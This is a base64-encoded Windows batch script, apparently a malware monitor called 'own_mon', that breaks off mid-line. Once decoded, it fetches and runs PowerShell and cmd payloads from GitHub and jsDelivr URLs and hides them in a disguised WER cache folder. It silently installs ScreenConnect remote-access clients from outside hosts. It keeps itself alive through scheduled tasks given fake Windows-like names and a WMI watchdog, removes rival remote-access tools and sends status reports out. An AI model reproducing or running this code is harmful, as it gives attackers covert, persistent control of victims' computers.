kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktF
RVBfRlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpz
ZXQgIkdSWVhBX0ZQPTk5MDgxOThlNjY4ZTQ3NTAiDQpzZXQgIldEPUM6XFByb2dyYW1EYXRhXE1p
Y3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJFVEw9QzpcUHJvZ3JhbURh
dGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0QlXG93
bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24uc3RhdGUiDQpzZXQgIkhCRkxBRz0l
V0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0K
c2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHVi
LWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiVEcyPWh0
dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3RnX3Jl
cG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0
aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5j
bWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpzZGVsaXZy
Lm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9zZWN1cmUuY21kP3Q9JVJBTkRP
TSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9N
JSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0
aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJ
Qj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3Av
bWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9XTkxJQjI9aHR0cHM6
Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5w
czE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnouY29t
L0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0
ICJNU0lfR1JZWEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmluL1NjcmVlbkNvbm5lY3QuQ2xpZW50
U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3QiDQpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3Lmdp
dGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiDQpz
ZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWIt
ZHJvcEBtYWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2V0dXAubXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBrZy5tc2kiDQpzZXQgIk1TSV9H
PSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5Hcnl4YS5tc2kiDQpzZXQgIk1TSUNBQ0hFX0c9
JVdEJVxwa2dfZ3J5eGEubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIlV0QlIiAyPm51
bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0KDQpzZXQgIk1P
TlZFUj1NMjUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCmZvciAvZiAidG9rZW5z
PTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAiRFQ9JWRhdGUlICV0aW1l
JSINCmVjaG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEgW3ZlciAlTU9OVkVSJV0g
4pSA4pSAPj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RBTExFRD0wIg0Kc2V0ICJQ
UklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xFRlQ9MCINCnNldCAiRk9S
RUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0KDQpyZW0g4pSA4pSAIFswXSBzaW5n
bGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRpY2tzIHJhY2luZyBtc2lleGVjKSDi
lIDilIANCnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2siDQppZiBleGlzdCAiJU1VVEVYJSIgKA0K
ICBmb3IgJSVBIGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0lJX50QSINCiAgcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAn
JU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVNVVRF
WCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCA4KSl7IGV4aXQgMSB9
IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNo
byB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVuZGxvY2FsDQogICAgZXhp
dCAvYiAwDQogICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9NJT4iJU1VVEVYJSINCg0K
cmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUpIOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
Yi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxDQppZiBleGlzdCAi
JVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIg
JSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0lJUwiDQppZiBub3QgZGVm
aW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVTeW5jIg0KaWYgbm90IGRlZmluZWQgVEFT
S19CIHNldCAiVEFTS19CPVBsYVNlcnZlckhlYWx0aCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQyBz
ZXQgIlRBU0tfQz1XZGlIb3N0UHJveHkiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Qgc2V0ICJUQVNL
X0Q9VGNwSXBDb25mbGljdFJlcyINCmlmIG5vdCBkZWZpbmVkIE1PX0Egc2V0ICJNT19BPTIiDQpp
ZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSAIFtBXSBhdXRvLXVw
ZGF0ZSBjb3JlIGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJD
VVJMPWN1cmwuZXhlIg0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1l
b3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVRHJSIgPm51bCAy
PiYxDQppZiBub3QgZXhpc3QgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgIiVDVVJMJSIgLUwgLS1jb25u
ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXciICIlVEcy
JSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAy
PiYxDQpmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIlV0QlXHRnX3JlcG9ydC5uZXciID5u
dWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVx0Z19yZXBvcnQubmV3IikgZG8gaWYgJSV+ekYg
R1RSIDE1MDAgbW92ZSAveSAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVdEJVx0Z19yZXBvcnQucHMx
IiA+bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVx0Z19yZXBvcnQubmV3IiA+bnVsIDI+JjENCiIl
Q1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUg
MzAgLW8gIiVXRCVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51bCAyPiYxDQppZiBub3Qg
ZXhpc3QgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0
IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVPV05TRUMyJSIgPm51
bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQ0K
ZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIgIiVXRCVcb3duX3NlY3VyZS5uZXciID5udWwg
Mj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25fc2VjdXJlLm5ldyIpIGRvIGlmICUlfnpGIEdU
UiA4MDAgbW92ZSAveSAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3duX3NlY3VyZS5jbWQi
ID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0QlXG93bl9zZWN1cmUubmV3IiA+bnVsIDI+JjENCiIl
Q1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUg
NDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCJSIgPm51bCAyPiYxDQppZiBub3QgZXhp
c3QgIiVXRCVcb3duX2xpYi5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1t
YXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIgIiVPV05MSUIyJSIgPm51bCAyPiYxDQph
dHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0KZmluZHN0ciAvQzoi
T1dOX0xJQiAgQlVJTEQiICIlV0QlXG93bl9saWIubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBp
biAoIiVXRCVcb3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0Ql
XG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVX
RCVcb3duX2xpYi5uZXciID5udWwgMj4mMQ0KcmVtIHNlbGYtdXBkYXRlOiBkb3dubG9hZCBuZXcg
b3duX21vbiwgYXBwbHkgQUZURVIgdGhpcyB0aWNrIChCVUlMRC12ZXJpZmllZCkNCnNldCAiU0VM
Rl9VUEQ9MCINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4
IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9XTk1PTiUiID5udWwgMj4m
MQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9tb24ubmV4dCIgIiVDVVJMJSIgLUwgLS1jb25uZWN0
LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4dCIgIiVPV05NT04y
JSIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fTU9OICBCVUlMRCIgIiVXRCVcb3duX21vbi5u
ZXh0IiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZm9yICUlRiBpbiAoIiVXRCVcb3du
X21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgKA0KICBmYyAvYiAiJVdEJVxvd25fbW9u
Lm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAxIHNl
dCAiU0VMRl9VUEQ9MSINCikNCmlmICIlU0VMRl9VUEQlIj09IjAiIGRlbCAvZiAvcSAiJVdEJVxv
d25fbW9uLm5leHQiID5udWwgMj4mMQ0KDQpyZW0g4pSA4pSAIFtCXSByZS1hcm0gY2hhaW4gMTog
b3duZXJzaGlwLWF3YXJlIChub3QgZXhpc3RlbmNlLW9ubHkpIOKUgOKUgA0KcmVtIEwxMS9NMjI6
IFF1ZXJ5LW9ubHkgc2tpcHBlZCByZWFybSB3aGVuIFdpbmRvd3MgYnVpbHQtaW4gdGFza3Mgc2hh
cmVkDQpyZW0gZGVmYXVsdCBuYW1lcyAoRGlhZ25vc2lzXFNjaGVkdWxlZCBldGMuKSAtPiBtb24g
bmV2ZXIgcmFuLCBubyBsb2cuDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBmb3Ig
L2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
czEiIC1BY3Rpb24gdGFza3MtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxv
d25fbW9uLmNtZCJgKSBkbyAoDQogICAgZWNobyB0YXNrc19lbnN1cmUgJSVSPj4iJUxPRyUiDQog
ICAgc2V0ICJUQVNLU19FTlNVUkU9JSVSIg0KICApDQopDQppZiBub3QgZXhpc3QgIiVFVEwlIiBt
a2RpciAiJUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgNCiAg
YXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkgL3kg
IiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQopDQoNCnJl
bSDilIDilIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikgaWYgbWlzc2lu
ZyDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMx
IiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
JVxvd25fbGliLnBzMSIgLUFjdGlvbiB3YXRjaGRvZy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1N
b25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvIHNldCAiV0RfU1RBVEU9JSVSIg0KICBpZiAv
SSAiIVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVEPj4iJUxP
RyUiDQopDQoNCnJlbSDilIDilIAgW0VdIGV4dGVybWluYXRlIGZvcmVpZ24gU0MgKyBkaXNhbGxv
d2VkIFJNTSAoQkVGT1JFIGhlYWwvaW5zdGFsbCwNCnJlbSAgICAgc28gdGhlIFNDIGluc3RhbGxl
ciBjdXN0b20gYWN0aW9uIG5ldmVyIGNvbGxpZGVzIHdpdGggcml2YWxzKSDilIDilIANCmlmIGV4
aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
aW9uIGV4dGVybWluYXRlIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KdGltZW91dCAv
dCA4IC9ub2JyZWFrID5udWwNCnNldCAiRk9SRUlHTl9MRUZUPTAiDQpmb3IgL2YgInRva2Vucz0y
IGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAvQzoi
U0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQogIHNldCAiRlA9JSVh
Ig0KICBzZXQgIkZQPSFGUDogPSEiDQogIGlmIC9JIG5vdCAiIUZQISI9PSIlS0VFUF9GUCUiIGlm
IC9JIG5vdCAiIUZQISI9PSIlQUxUX0ZQJSIgaWYgL0kgbm90ICIhRlAhIj09IiVHUllYQV9GUCUi
ICgNCiAgICBzZXQgL2EgQ09VTlQrPTENCiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xDQogICAg
c2V0ICJGT1JFSUdOX0xJU1Q9IUZPUkVJR05fTElTVCEhRlAhICINCiAgICBlY2hvIGZvcmVpZ25f
bGVmdF8hRlAhPj4iJUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5D
b25uZWN0IHByaW0vYWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9yIC9mICJ0b2tl
bnM9MSwyIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUF9GUCUpIiBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQg
IklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1TVEFURT0lJWIiDQopDQpzYyBxdWVyeSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90
IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiUFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQrPTENCikN
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlm
IG5vdCBlcnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0xDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3Js
ZXZlbCAxIHNldCAiQUxUX09LPTEiDQoNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1f
T0slIj09IjAiICgNCiAgZWNobyBzdmMgaGVhbCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBzdGFy
dCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICBzYyBzdGFy
dCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0
IC90IDYgL25vYnJlYWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
RUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNl
dCAiUFJJTV9PSz0xIg0KKQ0KcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJF
R0lTVEVSRUQgcHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5hcmllcyArIHN0
YXJ0cyB0aGUgc2VydmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3Zj
cykNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBz
dmMgZXNjYWxhdGUgcmVwYWlyPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMx
IiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQ
X0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRpbWVvdXQgL3QgOCAvbm9i
cmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIg
fCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09L
PTEiDQopDQpyZW0gTTE2OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0
ZXJlZCAtIGVhdGVuIGJ5IGFuIFNDLWZhbWlseQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5F
VkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUNCnJlbSBmcmVzaC1p
bnN0YWxsIGxhZGRlciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0aW5nICJ3b250IHN0YXJ0IiBmb3Jl
dmVyLg0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBzZXQg
IlJFR1NUQVRFPXVua25vd24iDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2Yg
ImRlbGltcz0iICUlUiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24g
cmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiJykgZG8gc2V0ICJSRUdT
VEFURT0lJVIiDQogIGVjaG8gb3JwaGFuX2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSINCiAgaWYg
L0kgIiFSRUdTVEFURSEiPT0ibm8iICgNCiAgICBlY2hvIG9ycGhhbl9zZXJ2aWNlX2RlbGV0ZT4+
IiVMT0clIg0KICAgIHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSki
ID5udWwgMj4mMQ0KICAgIHNldCAiSU5TVEFMTEVEPTAiDQogICkNCikNCmlmICIlSU5TVEFMTEVE
JSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGli
LnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRy
YSAic3ZjLXdvbnQtc3RhcnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVl
bkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1dCB3b250IHN0YXJ0Ig0KICBnb3RvIDpB
ZnRlckhlYWwNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBnb3RvIDpBZnRlckhlYWwNCg0KcmVt
IOKUgOKUgCBbRF0gcHJpbWFyeSBTQyBtaXNzaW5nIC0gaGVhbCBsYWRkZXIg4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpy
ZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNl
cnZpY2Ugd2l0aG91dA0KcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2ll
eGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4NCmVjaG8gc3ZjIG1pc3NpbmcgLSBoZWFsIGJl
Z2luPj4iJUxPRyUiDQpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIlS0VFUF9GUCUiDQpzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51
bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJ
TV9PSz0xIg0KICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJv
ZHVjdCBzdGlsbCByZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQNCnNldCAi
UkVHU1RBVEU9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVz
ZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0
ICJSRUdTVEFURT0lJVIiDQppZiAvSSAiIVJFR1NUQVRFISI9PSJ5ZXMiICgNCiAgZWNobyBwcmlt
YXJ5X3JlZ2lzdGVyZWRfc2tpcF9mcmVzaF9pbnN0YWxsPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAl
TU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0
YXRlIERPV04gIlByaW1hcnkgcmVnaXN0ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0gL2ZhIGZh
aWxlZDsgcmVmdXNlZCAvaSB0byBwcm90ZWN0IEFMVCINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiIN
CmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzElP3Q9JVJB
TkRPTSUiICJnaXRodWItcGtnIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxN
